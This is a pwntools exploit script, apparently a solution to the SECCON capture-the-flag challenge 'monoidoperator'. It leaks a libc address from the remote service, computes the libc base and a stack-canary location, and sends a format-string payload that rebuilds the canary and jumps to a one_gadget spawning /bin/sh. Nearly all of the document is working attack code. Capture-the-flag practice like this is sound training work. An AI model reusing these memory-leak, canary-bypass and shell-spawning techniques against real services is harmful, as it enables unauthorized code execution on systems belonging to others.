from pwn import *
context.log_level = 'debug'

TARGET = './orig_monoid'
HOST = 'monoidoperator.chal.seccon.jp'
PORT = 27182

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
        b sprintf
        c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


r.sendlineafter('choose?\n', '*')
r.sendlineafter('input?\n', '132') 
r.recvuntil('integers.\n') 
for i in range(132):
    r.sendline('1000')

r.recvuntil('choose?\n')

r.sendlineafter('choose?\n', '+')
r.sendlineafter('input?\n', '132') 
r.recvuntil('integers.\n') 
r.sendline('+')
for i in range(131):
    r.sendline('0')

r.recvuntil('answer is ')
leak = int(r.recvuntil('\n')[:-2])
base = leak - 0x1e4ca0 # remote
# canary = base + 0x1ec5e8
canary = base + 0x1ec568 # remote
dbg("leak")
dbg("base")
dbg("canary")

# r.sendlineafter('choose?\n', '+')
# r.sendlineafter('input?\n', '132') 

gadget = [
    0xe237f, # execve("/bin/sh", rcx, [rbp-0x70])
    0xe2383, # execve("/bin/sh", rcx, rdx)
    0xe2386, # execve("/bin/sh", rsi, rdx)
    0x106ef8 # execve("/bin/sh", rsp+0x70, environ)
]

r.sendlineafter('choose?\n', 'q') 
r.sendlineafter('name?\n', 'A') 

payload = ''
payload += 'AAAAAAAA'
payload += '%17$p' * 28
payload += '%s' # payload * 2
payload += 'B'*0x8  
payload += '%3$c' # null 1byte
payload += '%39$s' # canary 7byte
payload += p64(base+gadget[2])
payload = payload.ljust(0xb0, 'C')
payload += p64(canary+1) #  here is %39

r.sendlineafter('back!\n', payload) 

r.interactive()

